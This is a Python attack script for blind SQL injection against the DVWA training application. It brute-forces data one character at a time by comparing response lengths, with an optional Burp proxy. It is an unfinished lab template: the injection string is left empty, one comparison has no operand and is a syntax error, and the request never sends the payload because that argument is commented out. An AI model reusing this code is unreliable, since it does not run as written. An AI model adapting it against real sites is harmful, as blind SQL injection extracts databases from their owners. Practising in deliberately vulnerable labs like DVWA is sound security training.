#!/usr/bin/env python3
# DVWA medium blind sql injection


import requests
import string
import sys

def loop_inject(original_inject):

    letters = ''.join(string.ascii_letters + string.digits + string.punctuation)

    for char in letters:

        edit_inject = original_inject.replace("CHAR", str(ord(char)))


        burp_url = "http://YOUR_DVWA:80/vulnerabilities/sqli_blind/"    # change this for your DVWA host
        burp_cookies = {"PHPSESSID": "YOUR_SESSION", "security": "medium"}    # fix this
        burp_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate", "Referer": "http://lab/vulnerabilities/sqli_blind/", "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        burp_data = {"id": "{}".format(edit_inject), "Submit": "Submit"}
        burp_proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}


        r = requests.post(burp_url, headers=burp_headers, cookies=burp_cookies) # , data=burp_data, proxies=burp_proxy)   < uncomment if you need to use burp

        content_length = int(r.headers['Content-Length'])

        if (content_length != ):    # fix this
            return char

    return "\n\n"

def main():

    while True:

        query = input("sql> ")
        if "quit" in query:
            sys.exit(-1)

        for i in range(1,1000):

            original_inject = str("".format(query, i))    # figure out the injection
            get_char = str(loop_inject(original_inject))
            sys.stdout.write(get_char)
            sys.stdout.flush()

            if loop_inject(original_inject) == "\n\n":
                break


if __name__ in "__main__":

    print("[+] PHPSESSID=SOMETHING; security=medium")
    main()
